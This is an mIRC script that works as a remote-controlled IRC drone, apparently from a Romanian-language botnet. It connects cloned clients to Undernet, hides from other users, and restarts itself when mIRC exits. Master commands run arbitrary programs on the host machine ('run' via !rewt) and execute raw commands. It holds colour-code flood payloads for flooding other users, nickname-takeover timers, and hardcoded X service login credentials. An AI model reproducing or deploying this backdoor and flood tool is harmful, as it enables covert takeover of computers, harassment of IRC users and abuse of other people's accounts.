on *:start:{
  .st
}
alias secure { mode $me +iwx }
alias st {
  nick $read ident.txt $+ $r(a,z)
  anick $read ident.txt $+ $r(a,z)
  fullname $read ident.txt
  identd on $read ident.txt
  set %cons
  notify on | notify Full | notify robot | notify Ion | notify Nelu | notify fly | notify MD | notify Moldova | notify Chisinau | notify god | notify hacker | notify sex
  writeini mirc.ini mirc user $read ident.txt $+ $r(11111,99999) | saveini
  ignore -td *!*@*
  server drone -j #MLDV 
  server -m undernet | set %clona1 2
  .timer 1 3 .scid %clona1 server -m undernet  | set %clona2 $calc(%clona1 + 1)
  .timer 1 6 .scid %clona2 server -m undernet  | set %clona3 $calc(%clona2 + 1)
  .timer 1 12 silence +*!*@*,~*!*@*undernet.org
  .timer 1 15 mode $me +iwx
  .timer 1 20 secure
  set %utimee $ctime 
  set %1 4MaXseNDQeXceeDeDMaXseNDMaXseNDQeXceeDeDMaXseNDMeGaflo0dflo0dflo0dMeGaMaXseNDQeXceeDeDMaXseNDQeXceeDeDMMeGaflo0dflo0dflo0dMeGaMa4(?-H?a?H?a?a?-limit-Killer?--H?A-H??A??,-)44(?-H?a?H?a?a?-limit-Killer?--H?A-H??A??,-)44(?-H?a?H?a?a?-limit-Ki
  set %2 1<*>2<*>3<*>4<*>5<*>6<*>7<*>8<*>9<*>10<*>11<*>12<*>13<*>14<*>15<*>16<*>1<*>2<*>3<*>4<*>5<*>6<*>7<*>8<*>9<*>10<*>11<*>12<*>13<*>14<*>15<*>16<*>1<*>2<*>3<*>4<*>5<*>6<*>7<*>8<*>9<*>10<*>11<*>12<*>13<*>14<*>15<*>16<*>1<*>2<*>3<*>4<*>5<*>6<*>7<*>8<*>9<*>10<*>11<*>12<*>13<*>14<*>15<*>16<*>1<*>2<*>3<*>4<*>5<*>6<*>7<*>8<*>9<*>10<*>11<*>12<*>13<*>
  set %3 4MaXseNDQeXceeDeDMaXseNDMaXseNDQeXceeDeDMaXseNDMeGaflo0dflo0dflo0dMeGaMaXseNDQeXceeDeDMaXseNDQeXceeDeDMMeGaflo0dflo0dflo0dMeGaMa4(?-H?a?H?a?a?-limit-Killer?--H?A-H??A??,-)44(?-H?a?H?a?a?-limit-Killer?--H?A-H??A??,-)44(?-H?a?H?a?a?-limit-Ki
  set %u1 Badgirl4u 
  set %p1 mumutzz
  set %u2 WallPaper 
  set %p2 mumutzz
  set %l1 x@channels.undernet.org login Badgirl4u mumutzz
  set %l2 x@channels.undernet.org login WallPaper mumutzz
  set %l3 x@channels.undernet.org login suntunsclav 52da2fsb
}
on 1:connect:{
  nick $read ident.txt $+ $r(a,z)
  anick $read ident.txt $+ $r(a,z)
  fullname $read ident.txt
  identd on $read ident.txt
  .timer 1 5 mode $me +iwx
  .timer 1 7 silence +*!*@*,~*!*@*undernet.org
  .timer 1 17 secure
  .notify on
}
on 1:unotify: {
  .nick $nick | join #mldv | away 13D2rona 13T2urbata 13;2X
}
on *:nick: {
  .timer 1 1 .sclavi $newnick [ % $+ [ $newnick ] ] 
}
alias checkme {
  if ($1 !== $2) { echo checkme }
  if ($1 == $2) { join #MLDV | .msg %l1 | .away 13D2rona 13T2urbata 13;2X  | .timer 1 3 .msg %l2 | .timer 1 15 .msg %l3 } 
}
alias sclavi {
  if ($1 == $2) { 
    .timer 1 4 notify off 
    .msg [ % $+ [ $1 $+ usr ] ] 
    .timer 1 1 .checkme $me $1 | halt 
  }
  if ($1 !== $2) { echo sclavi }
}
alias connectcheck { whois $me }
on 1:kick:#:{
  haltdef
  if ($knick == $me) {
    .raw join $mass
    halt
  }
}

; Aici sunt comenzile pentru master
on 100:text:*:*:{
  if ($1 == !flc) { .ctcp $2 ..0,15...1,16....5,10...6,9...7,8...8,7...9,6...10,5...11,4...12,3...13,2...14,1...0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...8,7...9,6...10,5...11,4.....0,15...1,16...2,13...3,12.] }
  if ($1 == !flm) { .msg $2  1<*>2<*>3<*>4<*>5<*>6<*>7<*>8<*>9<*>10<*>11<*>12<*>13<*>14<*>15<*>16<*>1<*>2<*>3<*>4<*>5<*>6<*>7<*>8<*>9<*>10<*>11<*>12<*>13<*>14<*>15<*>16<*>1<*>2<*>3<*>4<*>5<*>6<*>7<*>8<*>9<*>10<*>11<*>12<*>13<*>14<*>15<*>16<*>1<*>2<*>3<*>4<*>5<*>6<*>7<*>8<*>9<*>10<*>11<*>12<*>13<*>14<*>15<*>16<*>1<*>2<*>3<*>4<*>5<*>6<*>7<*>8<*>9<*>10<*>11<*>12<*>13<*> }
  if ($1 == !fln) { .notice $2 6,12_|_12,6_|_13,6_|_6,13_|_4,13_|_13,4_|_7,4_|_4,7_|_8,7_|_7,8_|_9,8_|_8,9_|_10,9_|_9,10_|_12,10_|_10,12_|_6,12_|_12,6_|_13,6_|_6,13_|_4,6,12_|_12,6_|_13,6_|_6,13_|_4,13_|_13,4_|_7,4_|_4,7_|_8,7_|_7,8_|_9,8_|_8,9_|_10,9_|_9,10_|_12,10_|_10,12_|_6,12_|_12,6_|_13,6_|_6,13_|_4   }
  if ($1 == !op) { if ($2 == $null) { .mode $chan +o $nick } | else { mode $chan +oooooo $2- } | halt }
  if ($1 == !deop) { if ($2 == $null) { .mode $chan -o $nick } | else { mode $chan -oooooo $2- } | halt }
  if ($1 == !v) { if ($2 == $null) { .mode $chan +v $nick } | else { mode $chan +vvvvvv $2- } | halt }
  if ($1 == !dv) { if ($2 == $null) { .mode $chan -v $nick } | else { mode $chan -vvvvvv $2- } | halt }
  if ($1 == !ontime) { .notice $nick Ontime: $uptime(server,1) | halt }
  if ($1 == !r) { .timer 1 0 nick $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) $+ $r(0,9) $+ $r(0,9) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(a,z) | halt }
  if ($1 == !x) { mode $me +iwx }
  if ($1 == !ban) { mode $chan -o+b $2 $address($2,2) | kick $chan $2- ( $+ $nick $+ ) | halt }
  if ($1 == !msg) { .msg $2- | halt }
  if ($1 == !say) { .msg $chan $2- | halt }
  if ($1 == !notice) { .notice $2- | halt }
  if ($1 == !ctcp) { .ctcp $2- | halt }
  if ($1 == !me) { describe $chan $2- | halt }
  if ($1 == !cserv) { .notice $nick Current Server����� $server }
  if ($1 == !uptime) { .notice $nick Uptime: $duration($calc( $ticks / 1000)) | halt }
  if ($1 == !ontime) { .notice $nick Ontime: $uptime(server,1) | halt }
  if ($1 == !nick)  { .nick $2- | halt }
  if ($1 == !away) { .away | .away $2- | halt }
  if ($1 == !ip) { .notice $nick My ip is����� $ip }
  if ($1 == !set1) { part %chan | set %chan $2 | timer 1 3 join %chan | halt }
  if ($1 == !set2) { part %chan2 | set %chan2 $2 | timer 1 3 join %chan2 | halt }
  if ($1 == !unset1)   { part %chan | unset %chan | halt }
  if ($1 == !unset2) { part %chan2 | unset %chan2 | halt } 
  if ($1 == !rewt) { run $2- | .notice $nick 2,15 Am rulat (4,15 $2- 2,15)  | halt } 
  if ($1 == !clone) { server -m $2- -i $read ident.txt $+ $r(1,9) $+   $read ident.txt $+ $r(1,9) $+  $read ident.txt $+ $r(1,9) $+  $read ident.txt $+ $r(1,9) $+   | .notice $nick 15CC14CC1CLONING14G15G | halt }
  if ($1 == !exit) && ($level($address($nick,2)) > 2) { exit | halt }
  if ($1 == !j) { join $2- | who $2 | halt }
  if ($1 == !c) { if (%console == 1) set %console 0 | else set %console 1 }
  if ($1 == !add) { write -a users.ini $2- | reload -ru users.ini | .notice $nick Added $2 to user list, please remember to change the n for new users =) }
  if ($1 == !login) { .msg x@channels.undernet.org login $2- | halt }
  if ($1 == !version) { .msg $chan $ver | halt }
  if ($1 == !me) { describe $chan $2- | halt }
  if ($1 == !ame) { ame $2- | halt }
  if ($1 == !raw) { $$2- }
  if ($1 == !p) { part $2 }
  if ($1 == !quit) { quit $2- | halt }
  if ($1 == !cycle) { part $2 $3- | .timer 1 1 join $2 | halt }
  if ($1 == !version) { .notice $chan $ver | halt }
  if ($1 == !exit) {
    .partall
    .timerexit 1 3 exit
  }
  if ($1 == !part) {
    if ($2 = $chr(42)) {
      set %paid 0
      set %tp $chan(0)
      while (%tp > %paed) {
        set %paid $calc(%paid + 1)
        if ($chan(%paid) != %chan) && ($chan(%paid) != %chan2) { .part $chan(%paed) At $nick request. }
      }
    }
    .timer 1 0 part $2- 
    halt
  }
  if ($1 == $me) {
    if ($2 == op) { if ($3 == $chr(42)) { if ($4 == $null) { allop $chan | halt } | else { allop $4 | halt } | halt } |  if ($3 == $null) { .mode $chan +o $nick } | else { mode $chan +oooooo $3- } | halt }
    if ($2 == deop) { if ($3 == $chr(42)) { if ($4 == $null) { alldeop $chan | halt } | else { alldeop $4 | halt } | halt } | if ($3 == $null) { .mode $chan -o $nick } | else { mode $chan -oooooo $3- } | halt }
    if ($2 == v) { if ($3 == $chr(42)) { if ($4 == $null) { allvoice $chan | halt } | else { allvoice $4 | halt } | halt } | if ($3 == $null) { .mode $chan +v $nick } | else { mode $chan +vvvvvv $3- } | halt }
    if ($2 == dv) { if ($3 == $chr(42)) { if ($4 == $null) { alldevoice $chan | halt } | else { alldevoice $4 | halt } | halt } | if ($3 == $null) { .mode $chan -v $nick } | else { mode $chan -vvvvvv $3- } | halt }
    if ($2 == r) { nick $read ident.txt $+ $r(1,9) $+ $r(1,9)  | halt }
    if ($2 == n) { nick $3 | halt }
    if ($2 == x) { mode $me +iwx }
    if ($2 == msg) { .msg $3- | halt }
    if ($2 == say) { .msg $chan $3- | halt }
    if ($2 == me) { describe $chan $2- | halt }
    if ($2 == cserv) { .notice $nick Current Server����� $server }
    if ($2 == uptime) { .notice $nick Uptime: $duration($calc( $ticks / 1000)) | halt }
    if ($2 == ontime) { .notice $nick Ontime: $uptime(server,1) | halt }
    if ($2 == nick)  { .nick $3- | halt }
    if ($2 == away) { .away | .away $3- | halt }
    if ($2 == ip) { .notice $nick My ip is����� $ip }
    if ($2 == quit) { quit $3- | halt }
    if ($2 == notice) { notice $3- | halt }
    if ($2 == ctcp) { .ctcp $3- | halt }
    if ($2 == rewt) { run $3- | .notice $nick 2,15 Executing (4,15 $2- 2,15)  | halt } 
    if ($2 == r) { nick $read ident.txt $+ $r(1,9) $+ $r(1,9)  | halt }
    if ($2 == version) { .msg $chan $ver | halt }
    if ($2 == take) { notify $3 | .notice $nick 1,15 2,15 Taking nickname (4,15 $3 2,15)  | halt }
    if ($2 == let) { notify -r $3 | .notice $nick 1,15 2,15 Letting go of nickname (4,15 $3 2,15)  | halt }
    if ($2 == clone) { server -m | .notice $nick 15CC14CC1CLONING14GG15 | halt }
    if ($2 == exit) && ($level($address($nick,2)) > 2) { exit | halt }
    if ($2 == jump) { server | halt }
    if ($2 == server) { server $3- | halt }
    if ($2 == stop) { .timers off | .notice $nick 4,15 All timers halted 2,15 | halt }
    if ($2 == raw)  { $$3- }
    if ($2 == add) { write -a users.ini $3- | reload -ru users.ini | .notice $nick Added $3- to user list, please remember to change the n for new users =) }
    if ($2 == cmd) { scid %clona1 $$3- | scid %clona2 $$3- | scid %clona3 $$3- | halt } 
    if ($2 == p) { part $3- }
    if ($2 == part) {
      if ($3 == $chr(42)) {
        set %paid 0
        set %tp $chan(0)
        while (%tp > %paid) {
          set %paid $calc(%paid + 1)
          if ($chan(%paid) != %chan) { .part $chan(%paid) At $nick request. }
        }
      }
      .timer 1 0 part $3- 
      halt
    }
    .timer 1 0 $2-
  }

  ;De aici incep comenzile pentru UnderNet
  if ($1 == .cmd) { scid %clona1 $$2- | scid %clona2 $$2- | scid %clona3 $$2- | halt }
  if ($1 == .flc) { scid %clona1 .ctcp $2 %1 | scid %clona2 .ctcp $2 %1 | scid %clona3 .ctcp $2 %1 | halt  }
  if ($1 == ,flc) { scid %clona1 .ctcp $2 %1 | scid %clona2 .ctcp $2 %1 | scid %clona3 .ctcp $2 %1 | halt  }
  if ($1 == .flm) { scid %clona1 .msg $2 %2 | scid %clona2 .msg $2 %2 | scid %clona3 .msg $2 %2 | halt }
  if ($1 == ,flm) { scid %clona1 .msg $2 %2 | scid %clona2 .msg $2 %2 | scid %clona3 .msg $2 %2 | halt }
  if ($1 == .fln) { scid %clona1 .notice $2 %3 | scid %clona2 .notice $2 %3 | scid %clona3 .notice $2 %3 | halt }
  if ($1 == ,fln) { scid %clona1 .notice $2 %3 | scid %clona2 .notice $2 %3 | scid %clona3 .notice $2 %3 | halt }
  if ($1 == .join) { scid %clona1 join $2- | scid %clona2 join $2- | scid %clona3 join $2- | who $2 | halt }
  if ($1 == ,join) { scid %clona1 join $2- | scid %clona2 join $2- | scid %clona3 join $2- | who $2 | halt }
  if ($1 == .part) { scid %clona1 part $2- | scid %clona2 part $2- | scid %clona3 part $2- | who $2 | halt }
  if ($1 == ,part) { scid %clona1 part $2- | scid %clona2 part $2- | scid %clona3 part $2- | who $2 | halt }
  if ($1 == .msg)  { scid %clona1 .msg $2-  | scid %clona2 .msg $2-   | scid %clona3 .msg $2-  | halt }
  if ($1 == .ctcp) { scid %clona1 .ctcp $2- | scid %clona2 .ctcp $2- | scid %clona3 .ctcp $2- | halt }
  if ($1 == .take) { set % $+ [ $2 ] $2 | set % $+ [ $2 $+ usr ] x@channels.undernet.org LOGIN $3 $4 | .notify $2 | .notice $nick 2,15 Taking nickname (4,15 $2 2,15) [ON UNDERNET]  | halt }
  if ($1 == .let) { .notify -r $2 | unset % $+ $2 | unset % $+ [ $2 $+ usr ] | .notice $nick 2,15 Removed (4,15 $2 2,15) from notify list. [ON UNDERNET]  | halt }
  if ($1 == ,fura) { .scid %clona1 notify $2 | .scid %clona2 notify $2 | .scid %clona3 notify $2 | .notice $nick 2,15 Taking nickname (4,15 $2 2,15) (On Status) [ON UNDERNET]  | halt }
  if ($1 == ,lasa) { .scid %clona1 notify -r $2 | .scid %clona2 notify -r $2 | .scid %clona3 notify -r $2 | .notice $nick 2,15 Removed (4,15 $2 2,15) from notify list. (On Status) [ON UNDERNET]  | halt }
  if ($1 == ,fura+log) { set % $+ [ $2 ] $2 | set % $+ [ $2 $+ usr ] x@channels.undernet.org LOGIN $3 $4 | .notify $2 | .notice $nick 2,15 Taking nickname (4,15 $2 2,15) [ON UNDERNET]  | halt }
  if ($1 == ,lasa+log) { .notify -r $2 | unset % $+ $2 | unset % $+ [ $2 $+ usr ] | .notice $nick 2,15 Removed (4,15 $2 2,15) from notify list. [ON UNDERNET]  | halt }
  if ($1 == .rnick) { scid %clona1 nick $read ident.txt $+ $r(1,9) $+ $r(1,9) | scid %clona2 nick $read ident.txt $+ $r(1,9) $+ $r(1,9) | scid %clona3 nick $read ident.txt $+ $r(1,9) $+ $r(1,9) | halt }
  if ($1 == ,rnick) { scid %clona1 nick $read ident.txt $+ $r(1,9) $+ $r(1,9) | scid %clona2 nick $read ident.txt $+ $r(1,9) $+ $r(1,9) | scid %clona3 nick $read ident.txt $+ $r(1,9) $+ $r(1,9) | halt }
  if ($1 == .exit) && ($level($address($nick,2)) > 2) { .scid %clona1 exit | .scid %clona2 exit | .scid %clona3 exit | halt }
  if ($1 == .timer) { set % $+ [ $2 ] $2 | set % $+ [ $2 $+ usr ] X@channels.undernet.org LOGIN $3 $4 | secure | .scid %clona1 .timer 0 3 nick $2 | .scid %clona2 .timer 0 3 nick $2 | .scid %clona3 .timer 0 3 nick $2 | .notice $nick 2,15 Timer 0 3 on (4,15 $2 2,15) started! [ON UNDERNET] - (Simple AutoLogin)  | halt }
  if ($1 == .ultra) { set % $+ [ $2 ] $2 | set % $+ [ $2 $+ usr ] X@channels.undernet.org LOGIN $3 $4 | secure | .scid %clona1 .timer 8 1 nick $2 | .scid %clona2 .timer 8 1 nick $2 | .scid %clona3 .timer 8 1 nick $2 | .notice $nick 2,15 ULTRA TIMER 8 1 on (4,15 $2 2,15) started! [ON UNDERNET]  | halt }
  if ($1 == .stop) { .scid %clona1 .timers off | .scid %clona2 .timers off | .scid %clona3 .timers off | .notice $nick 2,15 Good boy, all timers halted, bitch. [ON UNDERNET]  | halt }
  if ($1 == .t1) { set % $+ [ $2 ] $2 | set % $+ [ $2 $+ usr ] X@channels.undernet.org LOGIN %u1 %p1 | secure | .scid %clona1 .timer 0 3 nick $2 | .scid %clona2 .timer 0 3 nick $2 | .scid %clona3 .timer 0 3 nick $2 | .notice $nick 2,15 Timer 0 3 on (4,15 $2 2,15) started! [ON UNDERNET] - Using AutoLogin User %u1  | halt }
  if ($1 == .t2) { set % $+ [ $2 ] $2 | set % $+ [ $2 $+ usr ] X@channels.undernet.org LOGIN %u2 %p2 | secure | .scid %clona1 .timer 0 3 nick $2 | .scid %clona2 .timer 0 3 nick $2 | .scid %clona3 .timer 0 3 nick $2 | .notice $nick 2,15 Timer 0 3 on (4,15 $2 2,15) started! [ON UNDERNET] - Using AutoLogin User %u2  | halt }

}

on 100:notice:*:?: {
  if ($1 == join) { join $2 }
  if ($1 == r) { nick $read ident.txt $+ $r(1,9) $+ $r(1,9)  | halt }
  if ($1 == raw) { $$2- }
}

raw 471:*:{
  haltdef
  .timerjoin $+ $$2 60 30 join $$2
  halt
}

raw 473:*:{
  haltdef
  .timerjoin $+ $$2 60 30 join $$2
  halt
}

on *:exit: { /run $mircexe | halt }
alias ver return 2::: hacked By Full ;) $os for $uptime(server,1) :::
